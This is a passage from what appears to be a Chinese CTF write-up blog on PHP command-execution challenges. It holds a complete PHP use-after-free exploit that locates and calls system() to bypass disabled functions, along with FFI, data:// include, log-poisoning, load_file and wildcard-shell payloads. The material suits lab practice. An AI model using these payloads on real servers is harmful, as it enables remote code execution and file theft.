class="hljs-string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="hljs-string">&quot;?&quot;</span>,<span class="hljs-variable">$s</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>获取缓冲区内容并且清除，然后把内容替换成<code>?</code></p><blockquote><p>?c=$it = new DirectoryIterator(“glob:///*”);foreach($it as $f) {echo$f-&gt;getFilename().”\n”;}die();</p></blockquote><p>UAF：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>pwn(<span class="hljs-string">&quot;cat /flag0.txt&quot;</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ctfshow</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>) </span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$abc</span>, <span class="hljs-variable">$helper</span>, <span class="hljs-variable">$backtrace</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Vuln</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$backtrace</span>;<br>            <span class="hljs-keyword">unset</span>(<span class="hljs-keyword">$this</span>-&gt;a);<br>            <span class="hljs-variable">$backtrace</span> = (<span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>)-&gt;getTrace();<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$backtrace</span>[<span class="hljs-number">1</span>][<span class="hljs-string">&#x27;args&#x27;</span>])) &#123;<br>                <span class="hljs-variable">$backtrace</span> = debug_backtrace();<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Helper</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span>, <span class="hljs-variable">$c</span>, <span class="hljs-variable">$d</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">str2ptr</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$str</span>, <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$s</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$address</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span> = <span class="hljs-variable">$s</span>-<span class="hljs-number">1</span>; <span class="hljs-variable">$j</span> &gt;= <span class="hljs-number">0</span>; <span class="hljs-variable">$j</span>--) &#123;<br>            <span class="hljs-variable">$address</span> &lt;&lt;= <span class="hljs-number">8</span>;<br>            <span class="hljs-variable">$address</span> |= ord(<span class="hljs-variable">$str</span>[<span class="hljs-variable">$p</span>+<span class="hljs-variable">$j</span>]);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$address</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ptr2str</span>(<span class="hljs-params"><span class="hljs-variable">$ptr</span>, <span class="hljs-variable">$m</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$out</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$m</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$out</span> .= sprintf(<span class="hljs-string">&quot;%c&quot;</span>,(<span class="hljs-variable">$ptr</span> &amp; <span class="hljs-number">0xff</span>));<br>            <span class="hljs-variable">$ptr</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$out</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$str</span>, <span class="hljs-variable">$p</span>, <span class="hljs-variable">$v</span>, <span class="hljs-variable">$n</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$str</span>[<span class="hljs-variable">$p</span> + <span class="hljs-variable">$i</span>] = sprintf(<span class="hljs-string">&quot;%c&quot;</span>,(<span class="hljs-variable">$v</span> &amp; <span class="hljs-number">0xff</span>));<br>            <span class="hljs-variable">$v</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">leak</span>(<span class="hljs-params"><span class="hljs-variable">$addr</span>, <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$s</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$abc</span>, <span class="hljs-variable">$helper</span>;<br>        write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x68</span>, <span class="hljs-variable">$addr</span> + <span class="hljs-variable">$p</span> - <span class="hljs-number">0x10</span>);<br>        <span class="hljs-variable">$leak</span> = strlen(<span class="hljs-variable">$helper</span>-&gt;a);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$s</span> != <span class="hljs-number">8</span>) &#123; <span class="hljs-variable">$leak</span> %= <span class="hljs-number">2</span> &lt;&lt; (<span class="hljs-variable">$s</span> * <span class="hljs-number">8</span>) - <span class="hljs-number">1</span>; &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$leak</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parse_elf</span>(<span class="hljs-params"><span class="hljs-variable">$base</span></span>) </span>&#123;<br>        <span class="hljs-variable">$e_type</span> = leak(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">2</span>);<br><br>        <span class="hljs-variable">$e_phoff</span> = leak(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x20</span>);<br>        <span class="hljs-variable">$e_phentsize</span> = leak(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">2</span>);<br>        <span class="hljs-variable">$e_phnum</span> = leak(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">2</span>);<br><br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$e_phnum</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$header</span> = <span class="hljs-variable">$base</span> + <span class="hljs-variable">$e_phoff</span> + <span class="hljs-variable">$i</span> * <span class="hljs-variable">$e_phentsize</span>;<br>            <span class="hljs-variable">$p_type</span>  = leak(<span class="hljs-variable">$header</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-variable">$p_flags</span> = leak(<span class="hljs-variable">$header</span>, <span class="hljs-number">4</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-variable">$p_vaddr</span> = leak(<span class="hljs-variable">$header</span>, <span class="hljs-number">0x10</span>);<br>            <span class="hljs-variable">$p_memsz</span> = leak(<span class="hljs-variable">$header</span>, <span class="hljs-number">0x28</span>);<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$p_type</span> == <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-variable">$p_flags</span> == <span class="hljs-number">6</span>) &#123;<br><br>                <span class="hljs-variable">$data_addr</span> = <span class="hljs-variable">$e_type</span> == <span class="hljs-number">2</span> ? <span class="hljs-variable">$p_vaddr</span> : <span class="hljs-variable">$base</span> + <span class="hljs-variable">$p_vaddr</span>;<br>                <span class="hljs-variable">$data_size</span> = <span class="hljs-variable">$p_memsz</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$p_type</span> == <span class="hljs-number">1</span> &amp;&amp; <span class="hljs-variable">$p_flags</span> == <span class="hljs-number">5</span>) &#123;<br>                <span class="hljs-variable">$text_size</span> = <span class="hljs-variable">$p_memsz</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$data_addr</span> || !<span class="hljs-variable">$text_size</span> || !<span class="hljs-variable">$data_size</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>        <span class="hljs-keyword">return</span> [<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$text_size</span>, <span class="hljs-variable">$data_size</span>];<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_basic_funcs</span>(<span class="hljs-params"><span class="hljs-variable">$base</span>, <span class="hljs-variable">$elf</span></span>) </span>&#123;<br>        <span class="hljs-keyword">list</span>(<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$text_size</span>, <span class="hljs-variable">$data_size</span>) = <span class="hljs-variable">$elf</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$data_size</span> / <span class="hljs-number">8</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$leak</span> = leak(<span class="hljs-variable">$data_addr</span>, <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &lt; <span class="hljs-variable">$data_addr</span> - <span class="hljs-variable">$base</span>) &#123;<br>                <span class="hljs-variable">$deref</span> = leak(<span class="hljs-variable">$leak</span>);<br><br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$deref</span> != <span class="hljs-number">0x746e6174736e6f63</span>)<br>                    <span class="hljs-keyword">continue</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>;<br><br>            <span class="hljs-variable">$leak</span> = leak(<span class="hljs-variable">$data_addr</span>, (<span class="hljs-variable">$i</span> + <span class="hljs-number">4</span>) * <span class="hljs-number">8</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &gt; <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$leak</span> - <span class="hljs-variable">$base</span> &lt; <span class="hljs-variable">$data_addr</span> - <span class="hljs-variable">$base</span>) &#123;<br>                <span class="hljs-variable">$deref</span> = leak(<span class="hljs-variable">$leak</span>);<br><br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$deref</span> != <span class="hljs-number">0x786568326e6962</span>)<br>                    <span class="hljs-keyword">continue</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">continue</span>;<br><br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$data_addr</span> + <span class="hljs-variable">$i</span> * <span class="hljs-number">8</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_binary_base</span>(<span class="hljs-params"><span class="hljs-variable">$binary_leak</span></span>) </span>&#123;<br>        <span class="hljs-variable">$base</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-variable">$start</span> = <span class="hljs-variable">$binary_leak</span> &amp; <span class="hljs-number">0xfffffffffffff000</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x1000</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$start</span> - <span class="hljs-number">0x1000</span> * <span class="hljs-variable">$i</span>;<br>            <span class="hljs-variable">$leak</span> = leak(<span class="hljs-variable">$addr</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$leak</span> == <span class="hljs-number">0x10102464c457f</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-variable">$addr</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_system</span>(<span class="hljs-params"><span class="hljs-variable">$basic_funcs</span></span>) </span>&#123;<br>        <span class="hljs-variable">$addr</span> = <span class="hljs-variable">$basic_funcs</span>;<br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-variable">$f_entry</span> = leak(<span class="hljs-variable">$addr</span>);<br>            <span class="hljs-variable">$f_name</span> = leak(<span class="hljs-variable">$f_entry</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>);<br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$f_name</span> == <span class="hljs-number">0x6d6574737973</span>) &#123;<br>                <span class="hljs-keyword">return</span> leak(<span class="hljs-variable">$addr</span> + <span class="hljs-number">8</span>);<br>            &#125;<br>            <span class="hljs-variable">$addr</span> += <span class="hljs-number">0x20</span>;<br>        &#125; <span class="hljs-keyword">while</span>(<span class="hljs-variable">$f_entry</span> != <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">trigger_uaf</span>(<span class="hljs-params"><span class="hljs-variable">$arg</span></span>) </span>&#123;<br><br>        <span class="hljs-variable">$arg</span> = str_shuffle(<span class="hljs-string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);<br>        <span class="hljs-variable">$vuln</span> = <span class="hljs-keyword">new</span> Vuln();<br>        <span class="hljs-variable">$vuln</span>-&gt;a = <span class="hljs-variable">$arg</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(stristr(PHP_OS, <span class="hljs-string">&#x27;WIN&#x27;</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;This PoC is for *nix systems only.&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-variable">$n_alloc</span> = <span class="hljs-number">10</span>;<br>    <span class="hljs-variable">$contiguous</span> = [];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n_alloc</span>; <span class="hljs-variable">$i</span>++)<br>        <span class="hljs-variable">$contiguous</span>[] = str_shuffle(<span class="hljs-string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);<br><br>    trigger_uaf(<span class="hljs-string">&#x27;x&#x27;</span>);<br>    <span class="hljs-variable">$abc</span> = <span class="hljs-variable">$backtrace</span>[<span class="hljs-number">1</span>][<span class="hljs-string">&#x27;args&#x27;</span>][<span class="hljs-number">0</span>];<br><br>    <span class="hljs-variable">$helper</span> = <span class="hljs-keyword">new</span> Helper;<br>    <span class="hljs-variable">$helper</span>-&gt;b = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-variable">$x</span></span>) </span>&#123; &#125;;<br><br>    <span class="hljs-keyword">if</span>(strlen(<span class="hljs-variable">$abc</span>) == <span class="hljs-number">79</span> || strlen(<span class="hljs-variable">$abc</span>) == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;UAF failed&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-variable">$closure_handlers</span> = str2ptr(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-variable">$php_heap</span> = str2ptr(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x58</span>);<br>    <span class="hljs-variable">$abc_addr</span> = <span class="hljs-variable">$php_heap</span> - <span class="hljs-number">0xc8</span>;<br><br>    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">2</span>);<br>    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">6</span>);<br><br>    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x10</span>, <span class="hljs-variable">$abc_addr</span> + <span class="hljs-number">0x60</span>);<br>    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0xa</span>);<br><br>    <span class="hljs-variable">$closure_obj</span> = str2ptr(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x20</span>);<br><br>    <span class="hljs-variable">$binary_leak</span> = leak(<span class="hljs-variable">$closure_handlers</span>, <span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$base</span> = get_binary_base(<span class="hljs-variable">$binary_leak</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$elf</span> = parse_elf(<span class="hljs-variable">$base</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$basic_funcs</span> = get_basic_funcs(<span class="hljs-variable">$base</span>, <span class="hljs-variable">$elf</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!(<span class="hljs-variable">$zif_system</span> = get_system(<span class="hljs-variable">$basic_funcs</span>))) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);<br>    &#125;<br><br><br>    <span class="hljs-variable">$fake_obj_offset</span> = <span class="hljs-number">0xd0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x110</span>; <span class="hljs-variable">$i</span> += <span class="hljs-number">8</span>) &#123;<br>        write(<span class="hljs-variable">$abc</span>, <span class="hljs-variable">$fake_obj_offset</span> + <span class="hljs-variable">$i</span>, leak(<span class="hljs-variable">$closure_obj</span>, <span class="hljs-variable">$i</span>));<br>    &#125;<br><br>    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x20</span>, <span class="hljs-variable">$abc_addr</span> + <span class="hljs-variable">$fake_obj_offset</span>);<br>    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x38</span>, <span class="hljs-number">1</span>, <span class="hljs-number">4</span>);<br>    write(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0xd0</span> + <span class="hljs-number">0x68</span>, <span class="hljs-variable">$zif_system</span>);<br><br>    (<span class="hljs-variable">$helper</span>-&gt;b)(<span class="hljs-variable">$cmd</span>);<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br><br>ctfshow(<span class="hljs-string">&quot;cat /flag0.txt&quot;</span>);ob_end_flush();<br><span class="hljs-comment">#需要通过url编码</span><br></code></pre></td></tr></table></figure><p>数据库 load_file 读取：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<span class="hljs-keyword">try</span> &#123;<span class="hljs-variable">$dbh</span> = <span class="hljs-keyword">new</span> PDO(<span class="hljs-string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>, <span class="hljs-string">&#x27;root&#x27;</span>,<span class="hljs-string">&#x27;root&#x27;</span>);<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$dbh</span>-&gt;query(<span class="hljs-string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$row</span>)&#123;<span class="hljs-keyword">echo</span>(<span class="hljs-variable">$row</span>[<span class="hljs-number">0</span>]).<span class="hljs-string">&quot;|&quot;</span>; &#125;<span class="hljs-variable">$dbh</span> = <span class="hljs-literal">null</span>;&#125;<span class="hljs-keyword">catch</span> (PDOException <span class="hljs-variable">$e</span>) &#123;<span class="hljs-keyword">echo</span> <span class="hljs-variable">$e</span>-&gt;getMessage();<span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);&#125;<span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<span class="hljs-comment">#删除所有缩进</span><br></code></pre></td></tr></table></figure><p>php74 特性：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$ffi</span> = FFI::cdef(<span class="hljs-string">&quot;int system(const char *command);&quot;</span>);<span class="hljs-comment">//创建一个system对象</span><br><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;/readflag &gt; 1.txt&#x27;</span>;<span class="hljs-comment">//没有回显的</span><br><span class="hljs-variable">$ffi</span>-&gt;system(<span class="hljs-variable">$a</span>);<span class="hljs-comment">//通过$ffi去调用system函数</span><br></code></pre></td></tr></table></figure><blockquote><p>${PATH:~A}${PWD:~A}${IFS}????.???</p></blockquote><h2 id="include-c"><a href="#include-c" class="headerlink" title="include(c)"></a>include(c)</h2><p>data://，可以让用户来控制输入流，当它与包含函数结合时，用户输入的 data://流会被当作 php 文件执行</p><blockquote><p>data://text/plain,&lt;?php system(ls)?&gt;</p><p>data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</p></blockquote><p>也可以包含日志文件 抓包 在 UA 或者头部访问一句话即不存在的资源 放包 然后包含即可</p><h2 id="system-c"><a href="#system-c" class="headerlink" title="system(c)"></a>system(c)</h2><ul><li>回显丢进黑洞</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    system(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>执行 shell 命令时，会默认打开三个文件</p><table><thead><tr><th align="center">类型</th><th align="center">文件描述符</th><th align="center">执行情况</th><th align="center">句柄位置</th></tr></thead><tbody><tr><td align="center">标准输入</td><td align="center">0</td><td align="center">从键盘会的输入</td><td align="center">/proc/self/fd/0</td></tr><tr><td align="center">标准输出</td><td align="center">1</td><td align="center">输出到控制台</td><td align="center">/proc/self/fd/1</td></tr><tr><td align="center">错误输出</td><td align="center">2</td><td align="center">输出到控制台</td><td align="center">/proc/self/fd/2</td></tr></tbody></table><ol><li>输出</li></ol><table><thead><tr><th align="center">命令</th><th align="center">介绍</th></tr></thead><tbody><tr><td align="center">command &gt;filename</td><td align="center">把标准输出重定向到新文件中</td></tr><tr><td align="center">command 1&gt;filename</td><td align="center">同上</td></tr><tr><td align="center">command &gt;&gt;filename</td><td align="center">把标准输出追加到文件中</td></tr><tr><td align="center">command 1&gt;&gt;filename</td><td align="center">同上</td></tr><tr><td align="center">command 2&gt;filename</td><td align="center">把标准错误重定向到新文件中</td></tr><tr><td align="center">command 2&gt;&gt;filename</td><td align="center">把标准错误追加到新文件中</td></tr></tbody></table><blockquote><p>假如更改文件描述符的指向，就能重定向输入输出。比如我们将 1 指向文件，那么标准的输出就会输出到文件中。</p><p>使用&gt;或者&gt;&gt;对<strong>输出</strong>进行重定向。符号的左边表示文件描述符，如果没有的话表示 